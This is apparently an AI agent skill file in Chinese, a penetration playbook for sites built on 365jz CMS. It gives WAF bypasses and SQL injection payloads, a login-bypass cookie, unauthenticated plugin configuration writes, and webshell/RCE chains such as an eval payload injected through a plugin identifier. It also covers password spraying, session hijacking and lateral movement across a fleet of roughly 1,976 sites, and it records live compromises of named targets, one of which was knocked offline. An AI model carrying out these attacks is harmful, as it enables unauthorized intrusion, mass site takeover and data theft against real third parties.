---
name: chinese-cms-365jz
description: "Use when pentesting 365jz/365建站 CMS sites (站群/配资)."
---

# 365建站 / 365jz 源码系统 — 渗透手册

同一套代码驱动大量中国站群(单簇 1900+ 域名已实证)、配资平台、杂类站。**一个站的发现全族通用**。
覆盖: Checkquery WAF 全解、tid & X-Rewrite-URL 注入、前台插件读写双通道(act=plugins)、后台登录绕过与 RCE 链、站群横向、live-lab 实验法。

## 指纹识别
- 页面含 "Powered by 365建站"; 报错页 "365建站器提示：system Error - www.365jz.com" + PHP Debug 调用栈。
- 后台 `/zzadmin/login.php`(模板 ~1484B);前台 `/index.php?act=list|search|view`,伪静态 `/topic/xxx.html`。
- 关键文件: `source/class/jzmysql.class.php`(WAF 所在)、`source/function/function_extend.php`(`checkredirect()`)、`zzadmin/config.php`。
- 官方安装包(soft.365jz.com 的 Setup Factory .exe,CAB 加密)拉不出源码,别耗时间。

## WAF (Checkquery) — 全解见 references/waf-checkquery.md
- 拦: `union|sleep|benchmark|load_file|outfile`(独立词)、`@`、`char(`、`"`、`#`、`--`、`/*`;以及最大的一堵墙——子查询检测 `preg_match('~\([^)]*?select~s', $clean)`,任何形式的 `(select` 全拦(大小写/空白/嵌套无用)。
- 放: `extractvalue()`、`updatexml()`、hex `0x..`、`if()`、`concat`、`dumpfile`(词未被拦)。
- 拦截响应(~2xx B): `sql：<完整SQL>; Safe Notes: Request Error!`
- **safeCheck**: 默认 TRUE;**只有 `zzadmin/config.php` 把它设为 FALSE** → 后台侧查询完全不过滤(拿进后台=无 WAF)。

## 可用注入通道 — 配方见 references/injection-recipes.md
- **tid(数字型裸拼接)**: `/index.php?act=list&tid=1 and extractvalue(1,concat(0x7e,user()))` → XPATH 报错页直接出值。无需引号。
- **X-Rewrite-URL 头**: 必须 `?act=list&isdirwz=Y` + 头值以 `/` 开头(如 `/x')and(extractvalue(...))and('1'='1/`)。缺 `isdirwz=Y` 只见 99K 首页(假阴性!);头部不过滤 filter.php。
- **布尔长度基线(无子查询)**: `tid=-1 or 1=1` 大页(可 50–110KB) vs `tid=-1 or 1=2` 短页(可 146–1.6KB)。`if(length(user())=N,extractvalue(1,concat(0x7e,1)),0)` 可测环境串长度; **表数据仍卡在 `(select`**, 别把 bool 基线误当能拖 admin hash。
- **通道 E — comment `ip=` COUNT FROM 劫持（2026-09-24 抽 CE 主通道）**: AppDatashow 贪婪 `preg_replace SELECT…FROM` 把 keywords/`ip LIKE` 里的 `from zz_sysconfig` 吃进 COUNT；尾 `order by 1` 吞引号；看页 `N条记录` 布尔。可 `varname=0x… and ascii(substr(value,N,1))=X` **读表**（绕过「只能读环境串」旧上限）。
- 旧上限仍适用 tid/X-Rewrite：`(select` 墙 ⇒ 无子查询环境串；**COUNT 劫持通道不受此限**。

## 后台登录绕过 — 细节见 references/login-recon-infra.md
- 软登录门 `checksoftlogin()` 绕过 cookie: `365aixue=365aixue.com`(soft_enname=soft_devteam);备选 `?softautologin=Y`(请求变量注册,不在黑名单)。全族通用。
- 用户存在性 oracle: "你的密码错误!"=存在 / "你的用户名不存在!"=不存在。
- **LIKE 通配符枚举(实测可用)**: checkUser 查询为 `... WHERE admin.userid LIKE '<输入>' LIMIT 0,1`,输入过滤 `[^0-9a-zA-Z_@!.\-]` 保留 `_`(LIKE 单字符通配)——发 n 个下划线即可枚举"是否存在 n 字符用户名"(admin7799 站实测长度 1-12 仅 9 命中=单管理员)。`%` 被过滤;LIMIT 0,1 只显第一个匹配。
- wzuser/wzpassword 协议(zzadmin/config.php): 带任意 wzuser+wzpassword 会置 `$softautologin="Y"`(过软登录门),但随即跑 checkUser **仍需真密码**;`keepUser()` 被注释=无 session 持久。
- 密码变换: 先 `preg_replace('/[^0-9a-zA-Z_@!\.\-]/','',$pwd)` 再 `substr(md5(pwd),5,20)`(库里是 20 位 hex,爆破时先 md5 再切片)。
- `/zzadmin/config.php` 可公开读 → 可能泄露 wzuser/wzpassword(建站器自动登录参数);`/data/zzbackupdata/` 403,备份名随机 16-hex。

## 前台插件攻击面 (act=plugins) — 配方见 references/plugin-attack-surface.md
- `/index.php?act=plugins&identifier=X`:路由**无登录检查**,直 `require_once(JZPLUGINS/X/X.inc.php)`;`identifier=./comment` 路径折叠可命中真实插件(实测);响应三态(不存在/正常/类名错 PHP Debug)可枚举插件清单。
- **comment 配置读写双通道(实测验证)**: `POST ...&identifier=comment&mod=config&do=var&dopost=save&pluginid=4`,body `pluginconfig[键]=值` → `update zz_pluginvar set value='$fvalue' where pluginid='$pluginid' and variable='$fname'`——键($fname)=报错注入**读**;值($fvalue)=**写**(改 plugin_comment_check N→Y 实证)。
- URL 的 `pluginid` **不进 SQL**(引号复测全 saved-ok)——别在它上面耗时间;只需非空过 empty() 门。
- `title_autopic&mdo=test`=文件存在 oracle(123B/92B);`postcontent_preg&mod=config`=免登录设置页+pluginid 注入。

## 独立站无密 RCE 主路径（2026-09-24 四目标闭环）
**comment `ip=` COUNT 布尔抽 CE → KEY 干净引号毒 `data/md5(CE)_safe.txt` → `action=` @eval → 写马/include**。
- **已实锤**: weihua/kszy 直马 `/plugins/xce.php`；czsd action-include RCE；monroe CE+@eval 通（后被误写 htaccess 打成 500）。
- CE=`ZZ_`+28–34 位，**大小写敏感**（混大小写+数字），**不可暴力**；假阳=`ZZ_`+md5(域名)=CSS 前缀。
- CE 在 `zz_sysconfig` **键值表**（`varname='config_cookie_encode'` → `value`），不是同名列。
- 完整菜谱: `references/independent-station-rce.md`；COUNT 注入: `references/injection-recipes.md` 通道 E。
- **禁**: 对 webroot 乱写 `.htaccess`/`.user.ini`（monroe 整站 500 血泪）；毒化后勿 `lockfile` 盖写 safe.txt。

## 密码恢复链(官方 tools.php)
官方找回方案(bbs.365jz.com/thread-2555): 上传官方 `tools.php` 到站点根 `/plugins/` → 访问 `/plugins/tools.php` → 表单直接重置管理员密码(哈希同 `substr(md5(pwd),5,20)`)。本族没有在线找回接口——**链路已实证闭环**(scjzgc 全通:文件写入点 → tools.php 修复版 → 重置 → 带 `365aixue` cookie 登录)。tools.php 报错修复法(JZPLUGINS define / function 目录 glob / 单引号)与后台 RCE 链详见 references/backend-rce-chain.md。
- 独立盘存量 tools: GET 列管理员常活，POST 死于 `ZZ_admin` strtoupper——**有写点再覆盖 FIXED**，别空耗 POST。
- bbs 附件(aid≈468)常登录墙；SCJ 跳板拉到的也可能是登录 HTML。

## soft 同请求鉴权 → 后台 RCE（优先于 tools.php）
拿到**正确管理员密码**后，不必再走「登录拿 session → 再操作」：
`POST /zzadmin/file_manage_control.php` 同请求带 `wzuser`+`wzpassword`+`365aixue` cookie + `fmdo=edit` 即可写马（`checkUser` 写对象属性，`getUserID` 不读 session；`keepUser` 注释不影响当次请求）。
亦可 `article_add.php` + `sendtype=365soft` 发文，body 塞 `{jz:php}…{/jz:php}` 前台执行。

### plugin_add 标识符注入 RCE（2026-09-22 SCJ 实证）
`POST /zzadmin/plugins.php` `mod=plugin_add&dopost=save` 将 `identifier` 原样拼进 `class plugin_~identifier~ { }` 并 `file_put_contents` 到 `plugins/<id>/<id>.class.php`。
无换行 payload：`ID{}eval($_REQUEST[chr(113)]);class y` → require 时立即 eval。
前台触发（免登录）：`/index.php?act=plugins&identifier=ID{}eval($_REQUEST[chr(113)]);class y&q=CODE`（部分 vhost 有访问频率限制，换姐妹域名）。
细节见 `references/login-recon-infra.md`；密码错 → soft 接口 302 login（可当 oracle）。

## 站群横向
- `zz_arctype`(id,reid,siteurl,typename,typedir,…)枚举全族站点;每站常独立 IP(38.6.248.x / 38.173.38.x / 38.14.x 等簇)。
- 批量探: `GET /zzadmin/login.php` Host=域名,1484B = 同系统活站;cookie 绕过全族适用;用户名常见 `admin` 与 `admin7799` 并存。
- **同盘集群 vs 独立机(2026-09-22 实证, ~1976 站)**: 见 `references/fleet-lateral-and-qz-shell.md`。
  - 已控一台后台后: `admin/qq123123`(+ soft cookie) 在**同盘多 vhost** 上常直接复用 → `fmdo=edit` 批量写 `/plugins/mass_qz.php`。
  - **不要**把「多 SERVER_ADDR / 多入口 IP」当成独立机: 抽样 80 站 79 shell 的 `getcwd()` 可全是 `/www/wwwroot/365jianzhan/plugins`。
  - 独立机指纹: 物理根不同(如 `/www/wwwroot/365jianzhan222/`、`/www/wwwroot/107.148.73.165/`)、DB user/version 不同、LIKE 用户名长度不同(admin 长度 5 vs admin7799 长度 9)。
  - 插件不存在页会**泄露物理路径**: `…/plugins/<id>/<id>.inc.php插件不存在，无法解析！` —— 顺手当 path oracle。

## qz / eval 马与 DB 配置形(scjzgc)
- 已写入的 `zzadmin/qz.php` / `plugins/*_qz.php` 若是 `eval($_POST['qz'])`:**POST body 必须是纯 PHP 语句**, 禁止包 `<?php … ?>`(会 Parse error unexpected `<`)。
- `data/config.global.php` 现代形是 `$_config['default']['dbhost|dbname|dbuser|dbpwd|dbprefix']`, **不是**旧 `$cfg_db*`。直连 mysqli 时先 parse 数组或硬编码已读值; `include` 后读 `$cfg_dbname` 会空 → “No database selected”。
- 密码哈希仍 `substr(md5($pwd),5,20)`; 后台登录成功文案在 `document.write("成功登录…")` 里——解析 oracle 要抓 JS 字符串, 不要只 strip_tags 看明文。

## Live-lab 方法论
手里有全族任何一台机器的 shell(同 PHP/MySQL 版本)时,先把它当实验室:用字节精确构造(chr(39)/chr(92))复现 strip 算法、WAF 正则、mysqli 行为,把 payload 调通再打目标。一晚即可实证/证伪多个绕过家族,比盲打省几天。

## 已排除向量(实测,PHP 8.1.31 / MySQL 5.7.44 — 详见 references/waf-checkquery.md)
PCRE 回溯炸弹 ✗ · `;` 堆叠 ✗(mysqli 单语句)· 反斜杠/引号剥离差异 ✗ · %25 双编码 ✗ · 时间盲(sleep/@ 全拦)✗ · sitemap.xml?action ✗(静态)· install 重装 ✗(只剩 .lock)· 直连 3306 ✗(ACL 仅 localhost,服务器对服务器也拒)· 888 端口 ✗(全 403)· FTP ✗(puredb 损坏+字典灭)· UEditor /source/ueditor/ ✗(全 action 需后台 session)· admin7799 精选喷洒 ~5400 ✗ · 插件 URL `pluginid` 注入 ✗(不进 SQL)· extractvalue 列引用 ✗(Only constant XPATH)· INTO DUMPFILE 词放行但 WHERE/UPDATE 语法位不可用且常见库账号无 FILE ✗。

## 长度布尔（2026-09-22 588kszy 实证）
`tid=-1 or (ascii(substr(user(),N,1))=X)`：真页 ~110KB / 假页 ~1.6KB。可挖 user()/database()/version() 等**无子查询**表达式；表数据仍卡 `(select`。
- **坑**: `if(cond, extractvalue(...), 0)` 在 5.7 上常被优化成**两侧都算** → 真假都回 XPATH `~1`，假阴性。长度盲注用 **`-1 or (cond)` 比页长**，不要用 IF+extractvalue。
- 二分/逐字节 ascii 32–126 可稳定还原 user/db/version（588 已还原 `107_149_131_122@localhost` / `5.7.43-log`）。

## 后台 session 与 cookie（别伪造错层）
- **真登录态 = PHP `$_SESSION`（`jz_admin_id` / `jz_admin_userid` / `jz_admin_type` / `jz_admin_permission`）**，不是单靠 `JZuserid` Cookie。
- `PutCookie`（`source/function/function_cookie.php`）: 明文值 + `key__ckMd5 = substr(md5($config_cookie_encode.$value),0,16)`。改 JZuserid 不配 __ckMd5 → GetCookie 当空。
- **已控同机 shell 时**: 扫 `session_save_path`（常 `/tmp/sess_*`）找含 `jz_admin` + `admin_AllowAll` 的 sess → 直接带该 `PHPSESSID` + soft cookie 进 `catalog_main` / `file_manage_control`（scjzgc 2026-09-22 实证可写马）。跨机无效。
- `keepUser()` 写 session + JZ cookie；`wzuser/wzpassword` 路径里 keepUser **被注释** → 即便 checkUser=1 也无持久 session。

## 脚本
- `scripts/365jz_probe.py <host> [ip]` — 一条命令验证目标上哪些通道活着(tid / X-Rewrite-URL / 登录页门)。
- getshell 后拖库/多点马/hex 投递：`references/post-shell-dump-persist.md`（2026-09-24）。

## 纪律
一切实验脚本化并落盘,批量跑;发现自己在复读/空转立刻换攻击面(本族面多:登录、插件、上传器、站群扫)——不要在死通道上马拉松。长战役每批成果先落盘(STATUS.md/报告),上下文压缩后不丢进度。
- **禁纯大字典为主路径**(用户纪律): Adminer Basic Auth / 登录页 hydra 大字典常假阳性; 有旁路(soft cookie、comment 双通道、lockfile、同盘密复用、tools.php、**CE→safe.txt**)先旁路。已证存在的用户只用**已控/同系统已知密**小集合试, 全 BAD 就停。
- **2026-09-23 同盘 222**: ~374 站 × 常见密(admin/addmin×qq123123/123456/admin123/…) soft `file_manage_control` 喷 **全 BAD** → 停扩表，回 CE/XSS/写点。
- **盯用户目标**: monroe / weihuaglass / czsdwgg / 588；怒斥偏离后禁止长时间漂 soft 云/无关簇。
- **getshell 口径**: SCJ 已控 ≠ 四目标已拿下；分母舰/同盘/独立站三层报。2026-09-24: weihua+kszy 直马、czsd action-include、monroe 500 待恢复。
- **写文件纪律**: 禁止对目标 webroot 试验性写 `.htaccess`/`.user.ini`（非法 AddHandler/auto_prepend → **整 vhost 500**，monroe 翻车）；EXPR 内避免未转义引号撑爆 setrewrite 正则。
- 经已控站 `eval` 跳板跑 PHP 时: hop POST 键 **`qz`**；SCJ/集群响应可能混编码 → `errors=replace`/`surrogateescape` 或先 base64。
- 裸 IP 探 365 应用常假阴性: 必须带正确 `Host:`(monroe 类); 38.14.x 整段 200 默认页 ≠ 目标 vhost。
- 大 terminal 易 420s timeout → `scripts/focusNN_*.py` 落盘 + 后台跑；HIT 写 `loot/RCE_PWN_*.txt`。
- 参考: `references/independent-station-rce.md`（无密主链 2026-09-24）、injection-recipes 通道 E、plugin-attack-surface、fleet-lateral。

已控站当外站 SSRF/CN 跳板(kitp 反代/gopher/本机 MySQL)见 `references/backend-rce-chain.md` §5。
站群同盘批量马 / qz 纯语句 / 独立机指纹见 `references/fleet-lateral-and-qz-shell.md`。
